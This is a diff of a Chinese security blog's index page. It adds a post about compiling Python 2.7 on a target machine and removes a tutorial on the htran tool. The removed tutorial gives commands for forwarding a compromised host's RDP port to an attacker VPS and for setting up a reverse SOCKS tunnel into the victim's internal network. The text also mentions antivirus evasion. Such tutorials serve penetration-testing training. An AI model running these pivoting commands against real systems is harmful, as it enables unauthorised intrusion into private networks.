@@ -139,6 +139,38 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/09/26/install-py27-on-centos/">
+                快速编译安装配置 py2.7 & jdk 1.7
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-26</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/python/">python</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;有时迫于无奈,我们需要在目标机器上安装一些自己的工具环境,尤其是linux(默认python版本是2.6.6的,现在有些脚本已经很难跑起来),至于win,其平台下的工具已经非常丰富了,这里就不说了</p>
+<p>0x02 编译安装python2.7:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development tools" -y</span></div><div class="line"><span class="comment"># yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel -y</span></div><div class="line"><span class="comment"># wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># tar xf Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># cd Python-2.7.11</span></div><div class="line"><span class="comment"># ./configure --prefix=/usr/local</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># python2.7</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import sys</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; sys.version</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/26/install-py27-on-centos/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/09/25/msf-socks4a/">
                 通向彼岸 之内网代理转发 [msf中的socs4a模块使用及meterpreter多级内网穿透]
             </a>
@@ -615,54 +647,6 @@
 <p><img src="/img/sscosk_win_rssocks.png" alt=""></p>
 <p>0x03 依然是回到自己本地通过各种socks代理工具,连到vps的socks代理的端口上,而后正常的访问目标内网资源即可<br><img src="/img/sscosk_win_proxifier.png" alt=""><br><img src="/img/sscosk_win_proxifier_rule.png" alt=""><br><img src="/img/sscosk_win_proxifier_res.png" alt=""><br><br></p>
 <p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这也是实际渗透过程个人比较推荐的内网代理方式,尤其当目标机器存在公网ip的时候,用这种方式进行内网渗透无疑是极好的,此工具基本是没有任何依赖,使用简单粗暴,相对来说也比较轻量,免杀就更不用说了[因为根本就不需要免杀],除此之外,还有很多其它优点,这里就不一一说了,大家自己多实践就会感受到了<br><br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/10/htran-portforward/">
-                通向彼岸 之内网代理转发 [ htran篇 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-10</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/port-forward/">port forward</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>htran 另一款要比lcx好用很多的端口转发及socks代理工具</p>
-<p>1)首先,是最常规的端口转发功能:</p>
-<p>0x01 首先,到vps上监听好指定的端口,意思是把本地的443端口流量转到本地的1234端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -listen 443 1234</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/htran_listen_win.png" alt=""></p>
-<p>0x02 然后,回到目标机器上执行,意思就是把肉鸡的3389端口的流量转到vps的443端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -slave 192.168.3.251[实际测试中应该是自己vps的ip] 443 192.168.32.134 3389</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/htran_slave_win.png" alt=""></p>
-<p>0x03 最后,再回到vps本地用指定的工具连接到最开始转出到的1234端口上,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span></div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/htran_listen_win_1.png" alt=""><br><img src="/img/htran_listen_win_2.png" alt=""></p>
-<p>2)其次,是相对比较实用的socks代理功能,让目标机器作为socks代理端,对目标内网进行渗透,不过这可能需要目标机器有个固定的公网ip,不然怎么练上去呢:</p>
-<p>0x01 先在目标机器上安装并启动socks5服务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -install</span></div><div class="line"><span class="comment"># HTran2.4.exe -start</span></div><div class="line"><span class="comment"># htran -remove  不用时,卸掉即可</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/htran_socks_install_start.png" alt=""></p>
-<p>0x02 然后,回到自己的vps上先监听好等会要连回来的端口,这里的-s才表示的是启用socks代理,而-p单单只是进行口转发<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -listen 1080 1234</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/htran_socks_listen.png" alt=""></p>
-<p>0x03 上面都准备好以后,此时再回到目标机器上,开始和vps建立socks连接,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -connect 192.168.3.251[实际测试中应该是自己vps的ip] 1080</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/htran_socks_connect.png" alt=""></p>
-<p>0x04 连接建立后,我们现在就可以回到我们自己本地的渗透系统中,安装好socskcap代理工具 [当然,你用别的socks客户端也一样],然后再工具设置中填写好vps的ip和socks代理的端口 [这里是1234这个端口],不过,要注意,如果你的vps开了防火墙,务必记得把这几个代理用到的端口都放开,要不然,数据是过不来的<br><img src="/img/htran_socks_sockcap.png" alt=""></p>
-<p>0x05 最后,再把自己常用的一些内网渗透工具加到sockscap中,就可以对目标进行正常的内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""></p>
-<p><br><br>关于htran:<br>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点还是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
 
         </div>
     
